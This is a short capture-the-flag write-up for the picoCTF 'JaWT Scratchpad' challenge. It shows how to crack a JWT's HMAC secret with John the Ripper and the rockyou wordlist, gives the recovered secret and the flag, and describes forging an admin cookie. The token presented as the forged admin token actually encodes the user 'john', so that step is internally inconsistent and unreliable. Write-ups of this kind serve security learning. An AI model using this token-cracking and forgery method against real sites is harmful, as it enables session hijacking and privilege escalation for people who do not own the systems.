# JaWT Scratchpad

If you log into the site as not admin, you are given a cookie called `jwt`. This is a [json web token](https://jwt.io/) and it has some data signed by a secret. If you can find the secret you can sign any data you like.



To do this first download the [rockyou wordlist](https://wiki.skullsecurity.org/Passwords) and extract. This is a list of words to help john guess the secret.

Save the jwt to something like `tk.jwt` and the wordlist to `rockyou.txt`

Now we can use [john the ripper](https://github.com/magnumripper/JohnTheRipper) to brute-force the secret. John will try loads of combinations until it gets it

```text
$ john tk.jwt --wordlist=./rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE4.1 4x])
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:04 DONE (2020-03-07 22:38) 0.2247g/s 1661Kp/s 1661Kc/s 1661KC/s ilovepinkxxx..ilovepets!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now that we have the secret, we can forge our own token. Go to `jwt.io` and put in the old token.

Changing the user to `admin` and the secret to `ilovepico` gives `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y`. 

Now just edit the cookie and get you flag.

Flag: `picoCTF{jawt_was_just_what_you_thought_9de8e25511a8841ab9ade0aa092be116}`